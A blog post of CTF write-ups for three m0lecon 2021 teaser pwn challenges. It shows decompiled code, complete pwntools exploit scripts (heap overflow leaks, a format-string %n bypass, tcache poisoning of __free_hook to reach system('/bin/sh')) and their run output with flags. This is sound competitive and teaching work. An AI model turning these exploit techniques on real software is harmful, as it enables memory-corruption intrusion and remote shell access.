+++
title = "m0lecon 2021 Teaser"
date = 2021-05-15

[taxonomies]
tags = ["ctf-writeups"]
+++

I competed in the teaser solo, ending up in 23rd place (dropped 13 places while sleeping rip). I solved the majority of the pwn challenges (fortran :( ) and have included solve scripts and brief explanations for them. Wasn't really feeling like in-depth writeups, but it should be sufficient to get an idea of the solution and you're welcome to contact me if you have questions. 

<!-- more -->

# little alchemy


```text
Alchemy is a wonderful world to explore. Are you able to become a skilled scientist? We need your help to discover many mysterious elements!

nc challs.m0lecon.it 2123

Note: the flag is inside the binary, and clearly it is different on the remote server. 
```

[littleAlchemy](/ctf/m0lecon-2021-teaser/little-alchemy/littleAlchemy)

so tl;dr flag is stuck on the stack

```c
void __thiscall Handler::Handler(Handler *this)

{
  undefined *puVar1;
  size_t sVar2;
  
  Element::Element((Element *)this,1);
  Element::Element((Element *)(this + 0x28),2);
  Element::Element((Element *)(this + 0x50),4);
  Element::Element((Element *)(this + 0x78),8);
  ElementHandler::ElementHandler((ElementHandler *)(this + 0xf0));
  puVar1 = flag;
  sVar2 = strlen(flag);
                    /* try { // try from 001029b5 to 001029b9 has its CatchHandler @ 001029bc */
  std::copy<char_const*,char*>(flag,puVar1 + sVar2,(char *)(this + 0x18));
  return;
}
```

and then we get a menu

```text
Operations: [1]->Create_element [2]->Print_element [3]->Print_all [4]->Edit_element [5]->Delete_element [6]->Copy_name [7]->Exit
```

```c
ElementHandler::copyName(ElementHandler *this,Element *param_1,Element *param_2)

{
  long lVar1;
  size_t sVar2;
  undefined8 uVar3;
  
  if ((param_1 == (Element *)0x0) || (param_2 == (Element *)0x0)) {
    uVar3 = 0;
  }
  else {
    if (param_1[8] == (Element)0x0) {
      if (param_1 == (Element *)0x0) {
        lVar1 = 0;
      }
      else {
        lVar1 = __dynamic_cast(param_1,&Element::typeinfo,&ComposedElement::typeinfo,0);
      }
      sVar2 = strlen((char *)(lVar1 + 0x28));
                    /* try { // try from 00102814 to 00102818 has its CatchHandler @ 00102822 */
      std::copy<char*,char*>
                ((char *)(lVar1 + 0x18),(char *)(lVar1 + 0x28 + sVar2),(char *)(param_2 + 0x18));
    }
    else {
      std::copy<char*,char*>
                ((char *)(param_1 + 0x18),(char *)(param_1 + 0x28),(char *)(param_2 + 0x18));
    }
    uVar3 = 1;
  }
  return uVar3;
}
```

copyName is vulnerable when copying a ComposedElement into an Element -- it does not do bounds checks or null terminating. This allows you to leak addresses inside later heap chunks by overflowing right up to the address and then printing. I leaked the program base and the address of the flag in the stack in this way. 

I then create an element and overwrite the destructor address with the showSources function, as well as overwriting the char pointer to one of the components with the flag address. At that point all I need to do is free the Element and it will execute showSources, printing the flag. 

```python
#!/usr/bin/env python3

from pwn import *
from hashlib import sha256

import re

exe = ELF("littleAlchemy")

context.binary = exe
context.terminal = "kitty"

def solvepow(p, n):
    s = p.recvline()
    starting = s.split(b'with ')[1][:10].decode()
    s1 = s.split(b'in ')[-1][:n]
    i = 0
    print("Solving PoW...")
    while True:
        if sha256((starting+str(i)).encode('ascii')).hexdigest()[-n:] == s1.decode():
            print("Solved!")
            p.sendline(starting + str(i))
            break
        i += 1

def conn():
    if args.REMOTE:
        r = remote("challs.m0lecon.it",2123)
        solvepow(r, n = 5)
        return r
    elif args.GDB:
        return gdb.debug([exe.path])
    else:
        return process([exe.path])


def send_menu(r, msg):
    r.sendline(msg)
    r.recvuntil(b"Exit\n>")

def main():
    r = conn()
    
    r.recvuntil(b"Exit\n>")

    send_menu(r, b"1 0 -1 -1")
    send_menu(r, b"1 1 -1 -3")
    send_menu(r, b"4 1 aaaaaaaabaaaaaaacaaaaaaa")
    send_menu(r, b"6 1 0")

    r.sendline(b"2 0")
    r.recvuntil(b"aaaaaaaabaaaaaaacaaaaaaa")
    program_base = u64(r.recvline().rstrip().ljust(8,b"\x00")) - 0x5d50
    r.recvuntil(b"Exit\n>")
    log.info("leaked program_base: " + hex(program_base))

    show_sources = program_base + 0x5d60 - 8
    flag_addr = program_base + 0x403b - 0x18

    send_menu(r, b"4 1 aaaaaaaabaaaaaaacaaaaaaadaaaaaaa")
    send_menu(r, b"1 2 -1 -3")
    send_menu(r, b"6 1 2")
    r.sendline(b"2 2")
    r.recvuntil(b"aaaaaaaabaaaaaaacaaaaaaadaaaaaaa")
    flag_addr = u64(r.recv(6).ljust(8,b"\x00")) + 0x18
    r.recvuntil(b"Exit\n>")
    log.info("leaked flag addr: " + hex(flag_addr))

    send_menu(r, b"4 1 aaaaaaaabaaaaaaacaaaaaaa" + p64(show_sources) + p64(flag_addr - 0x18))
    send_menu(r, b"6 1 0")

    r.sendline(b"5 1")
    r.sendline(b"7")

    log.info((b"flag found: " + re.search(b"(ptm{.*})", r.recvall()).group(1)).decode())
    # good luck pwning :)

    r.interactive()


if __name__ == "__main__":
    main()

```


```text
Solving PoW...
Solved!
/home/sky/Dropbox/ctf/m0lecon-teaser/little-alchemy/solve.py:22: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.sendline(starting + str(i))
[*] leaked program_base: 0x563fd3bf3000
[*] leaked flag addr: 0x7fff12a2a888
[+] Receiving all data: Done (201B)
[*] Closed connection to challs.m0lecon.it port 2123
[*] flag found: ptm{vT4bl3s_4r3_d4ng3r0us_019}
[*] Switching to interactive mode
[*] Got EOF while reading in interactive
$  
```

# another login (and yet another login)

```text
Just another simple login bypass challenge.

nc challs.m0lecon.it 1907
```
[chall](/ctf/m0lecon-2021-teaser/another_login/chall) 

[login](/ctf/m0lecon-2021-teaser/yet_another_login/login) (patched)

Neat challenge!  Never seen a format string challenge quite like this. Apparently there was an unintended solution and they put out a patched version later on. I solved it the intended way so my solution worked for both of them out of the box (was nice to get those points later on lol). 

```c
void signin(void)

{
  int iVar1;
  size_t sVar2;
  size_t sVar3;
  uint uVar4;
  long in_FS_OFFSET;
  int local_64;
  long local_60;
  long *local_58;
  long local_50;
  long local_48;
  long local_40;
  char local_38 [24];
  long local_20;
  
  local_20 = *(long *)(in_FS_OFFSET + 0x28);
  local_58 = &local_60;
  puts(
      "Welcome to my super secure login! Ready to enter the password? We also have a nice anti-botmechanism which asks you to sum each character!"
      );
  local_64 = 0;
  while( true ) {
    if (0xf < local_64) {
      win();
      if (local_20 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
        __stack_chk_fail();
      }
      return;
    }
    iVar1 = rand();
    uVar4 = (uint)(iVar1 >> 0x1f) >> 0x18;
    local_50 = (long)(int)((iVar1 + uVar4 & 0xff) - uVar4);
    local_48 = local_50;
    iVar1 = rand();
    uVar4 = (uint)(iVar1 >> 0x1f) >> 0x1d;
    local_40 = (long)(int)(((iVar1 + uVar4 & 7) - uVar4) + 2);
    printf("Give me the %d secret, summed to %ld!\n",(ulong)(local_64 + 1U),local_40,
           (ulong)(local_64 + 1U));
    fgets(local_38,0x13,stdin);
    iVar1 = atoi(local_38);
    local_60 = (long)iVar1;
    sVar2 = strspn(local_38,"0123456789");
    sVar3 = strlen(local_38);
    if (sVar2 != sVar3) {
      local_60 = 0;
    }
    puts("Your input is: ");
    printf(local_38,0);
    if (local_60 == 0) break;
    if (local_48 != local_50) {
      printf(
            "Looks like some memory corruption happened. Blame it on cosmic rays but I can\'t letyou in."
            );
                    /* WARNING: Subroutine does not return */
      exit(1);
    }
    if (local_50 + local_40 != local_60) {
      puts("NOPE, GET OUT OF MY SERVER!");
                    /* WARNING: Subroutine does not return */
      exit(1);
    }
    local_64 = local_64 + 1;
  }
  printf("??????");
                    /* WARNING: Subroutine does not return */
  exit(1);
}
```

It generates and transforms two random numbers, takes an input, and then compares the sum of those two transformed numbers to your numerical input (atoi). So, couple things to note here:

* If your input contains any non digit characters it will terminate
* It's vulnerable to a format string vulnerability (after the check for non digit chararacters but before the termiantion)
* Right at the top it adds the address of local_60 (your parsed input) to the stack which is quite suspicious

I quickly realized we could dodge the digit check by setting local_60 to a nonzero value with the %n operator but that didn't get me to the flag. The key realization was that you can dynamically control the width of a format string using an * instead of a number -- it will just pull an argument and use that. Additionally, you can control this positionally in a similar manner as a normal selector. So we have the ability to overwrite local_60 with the number of characters written so far, and the ability to pull a value off the stack positionally and write that many spaces to stdout. We can put this together to dynamically compute the sum of local_50 and local_40 and write it to local_60. 


```python
#!/usr/bin/env python3

from pwn import *
from hashlib import sha256
import re
import time
exe = ELF("chall")

context.binary = exe
context.terminal = "kitty"

def solvepow(p, n):
    s = p.recvline()
    starting = s.split(b'with ')[1][:10].decode()
    s1 = s.split(b'in ')[-1][:n]
    i = 0
    print("Solving PoW...")
    while True:
        if sha256((starting+str(i)).encode('ascii')).hexdigest()[-n:] == s1.decode():
            print("Solved!")
            p.sendline(starting + str(i))
            break
        i += 1

def conn():
    if args.REMOTE:
        r = remote("challs.m0lecon.it",1907)
        solvepow(r, n = 5)
        return r
    elif args.GDB:
        return gdb.debug([exe.path],gdbscript="b *signin+270\nc\nderef $rsp")
    else:
        return process([exe.path])


def main():
    r = conn()

    for i in range(0xf+1):
        r.sendline(b"%*10$c%*11$c%8$n")

    time.sleep(1)
    r.sendline(b"cat flag.txt;exit;")
    log.info((b"flag found: " + re.search(b"(ptm{.*})", r.recvall()).group(1)).decode())

    # good luck pwning :)

    r.interactive()


if __name__ == "__main__":
    main()
```

```text
❯ python solve.py REMOTE
[*] '/home/sky/Dropbox/ctf/m0lecon-teaser/another_login/chall'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to challs.m0lecon.it on port 1907: Done
Solving PoW...
Solved!
/home/sky/Dropbox/ctf/m0lecon-teaser/another_login/solve.py:21: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.sendline(starting + str(i))
[+] Receiving all data: Done (2.73KB)
[*] Closed connection to challs.m0lecon.it port 1907
[*] flag found: ptm{D1d_u_r3ad_th3_0per4t0r_m4nua1_b3f0re_l0gging_1n?}
[*] Switching to interactive mode
[*] Got EOF while reading in interactive
$ 
```

```text
❯ python solve.py REMOTE
[*] '/home/sky/Dropbox/ctf/m0lecon-teaser/yet_another_login/chall'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to challs.m0lecon.it on port 5556: Done
Solving PoW...
Solved!
/home/sky/Dropbox/ctf/m0lecon-teaser/yet_another_login/solve.py:21: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.sendline(starting + str(i))
[+] Receiving all data: Done (2.96KB)
[*] Closed connection to challs.m0lecon.it port 5556
[*] flag found: ptm{N0w_th1s_1s_th3_r34l_s3rv3r!_a526fd7c2b}
[*] Switching to interactive mode
[*] Got EOF while reading in interactive
$ 
```

# donut factory


```text
Come visit our factory to create your custom donuts!

nc challs.m0lecon.it 1743
```

[donut](/ctf/m0lecon-2021-teaser/donut/donut)
[libc-2.31.so](/ctf/m0lecon-2021-teaser/donut/libc.so.6)


Exploit looks like so:

1. leak heap address (and thus program base)
2. allocate big chunk so malloc uses mmap and then leak mmap base (and thus libc)
3. embed a fake chunk inside a bigger allocated chunk and then free the fake chunk
4. overwrite the fake chunk so that it's next pointer points to \_\_free\_hook - 1
5. allocate chunk of appropriate size so malloc returns \_\_free\_hook - 1 and write system to it
6. allocate a chunk containing "/bin/sh" and free it, calling system("/bin/sh")


```python
#!/usr/bin/env python3

from pwn import *
from hashlib import sha256

exe = ELF("donut")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.31.so")

context.binary = exe
context.terminal = "kitty"

def solvepow(p, n):
    s = p.recvline()
    starting = s.split(b'with ')[1][:10].decode()
    s1 = s.split(b'in ')[-1][:n]
    i = 0
    print("Solving PoW...")
    while True:
        if sha256((starting+str(i)).encode('ascii')).hexdigest()[-n:] == s1.decode():
            print("Solved!")
            p.sendline(starting + str(i))
            break
        i += 1

def conn():
    if args.REMOTE:
        r = remote("challs.m0lecon.it",1743)
        solvepow(r, n = 5)
        return r
    elif args.GDB:
        return gdb.debug(exe.path,gdbscript="c")
    else:
        return process(exe.path)


def create_donut(r, size, data):
    r.sendline(b"c")
    r.sendline(b"0")
    r.recvuntil(b"(y/n)\n")
    r.sendline(b"y")
    r.sendline(str(size).encode())
    r.sendline(data)
    r.recvuntil(b"retrieve your donut! ")
    return int(r.recvline().rstrip(),16)

def main():
    r = conn()


    # first we're going to leak some addresses
    # "donut codes" are raw pointers, which allows us to trivially leak heap (and thus program base) addresses
    # mmap (and thus libc) can be leaked also, because we're allowed to create arbitrary size allocations
    # for sufficiently large allocations, malloc will service the request by mapping memory


    heap_chunk = create_donut(r, 10, b"fake name")
    log.info("leaked heap chunk address: " + hex(heap_chunk))

    mmap_chunk = create_donut(r, 2097152, b"fake name") # beeg beeg malloc so its mmapped
    log.info("leaked mmapped address: " + hex(mmap_chunk))

    heap_base = heap_chunk - 0x16c0
    program_base = heap_chunk - 0x86c0
    libc_base = mmap_chunk + 0x203ff0

    free_hook = libc_base + 0x1eeb28
    system = libc_base + 0x55410
    pop_rsp = libc_base + 0x32b5a
    log.info("leaked program base: " + hex(program_base))
    log.info("leaked libc base: " + hex(libc_base))


    # add a chunk to tcache
    # it'll get overwritten later, but it is still needed
    # because tcache stores the count apart from the linked list
    chunk = create_donut(r, 16, b"abc")
    r.sendline(b"t")
    r.sendline(hex(chunk).encode())

    # create a big chunk with a fake chunk inside it
    fake_chunk_data = b"AAAAAAA"
    fake_chunk_data += p64(0x21) + b"\x00" * 0x20
    fake_chunk = create_donut(r, 512, fake_chunk_data)
    
    # free the fake chunk
    # this means that we have a chunk in tcachebins that we can control the metadata
    # because the metadata is inside another chunk
    r.sendline(b"t")
    r.sendline(hex(fake_chunk + 0x10).encode())


    # free the parent chunk so we can recycle it by creating another name of size 512
    r.sendline(b"t")
    r.sendline(hex(fake_chunk).encode())


    # so we're going to reallocate the parent chunk with an altered fake chunk
    # specifically, we're overwriting the next pointer (tcachebins are a linked list)
    # what this means is that we can add an (almost) arbitrary pointer to tcachebins
    # which malloc will return later

    fake_chunk_data = b"AAAAAAA"
    fake_chunk_data += p64(0x20)
    fake_chunk_data += p64(free_hook - 1) # -1 because the first allocated by is used to store cookie size

    fake_chunk = create_donut(r, 512, fake_chunk_data)


    # at this point, tcachebins has two chunks; our fake chunk and our free_hook "chunk"
    # Chunk(addr=0x560443eff710, size=0x20, flags=)  ←  Chunk(addr=0x7f892ae57b27, size=0x0, flags=) 
    # so we allocate a throwaway chunk and then a chunk which we use to overwrite free_hook

    create_donut(r, 16, b"fake idk")
    create_donut(r, 16, p64(system))

    # when free_hook gets called rdi is the address being freed
    # so we make a chunk containing /bin/sh
    # and then free it (+1 bc cookie size is stored in char 0)
    # calling system("/bin/sh")

    binsh_addr = create_donut(r, 16, b"/bin/sh") + 1
    log.info("/bin/sh chunk location at: " + hex(binsh_addr))

    r.sendline(b"t")
    r.sendline(hex(binsh_addr).encode())

    import time

    time.sleep(1)

    r.sendline(b"cat flag.txt; exit;")
    r.sendline(b"l")
    log.info((b"flag found: " + re.search(b"(ptm{.*})", r.recvall()).group(1)).decode())

    # good luck pwning :)

    r.interactive()


if __name__ == "__main__":
    main()
```

```text
❯ python solve.py REMOTE
[*] '/home/sky/Dropbox/ctf/m0lecon-teaser/donut/donut'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    RUNPATH:  b'.'
[*] '/home/sky/Dropbox/ctf/m0lecon-teaser/donut/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] '/home/sky/Dropbox/ctf/m0lecon-teaser/donut/ld-2.31.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to challs.m0lecon.it on port 1743: Done
Solving PoW...
Solved!
/home/sky/Dropbox/ctf/m0lecon-teaser/donut/solve.py:22: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.sendline(starting + str(i))
[*] leaked heap chunk address: 0x558e5bb9bac0
[*] leaked mmapped address: 0x7fccca4c9010
[*] leaked program base: 0x558e5bb93400
[*] leaked libc base: 0x7fccca6cd000
[*] /bin/sh chunk location at: 0x558e5bb9bd11
[+] Receiving all data: Done (475B)
[*] Closed connection to challs.m0lecon.it port 1743
[*] flag found: ptm{l1bc_l34k_fl4v0ur3d_d0nu7!_ae56b25f73}
[*] Switching to interactive mode
[*] Got EOF while reading in interactive
$  
```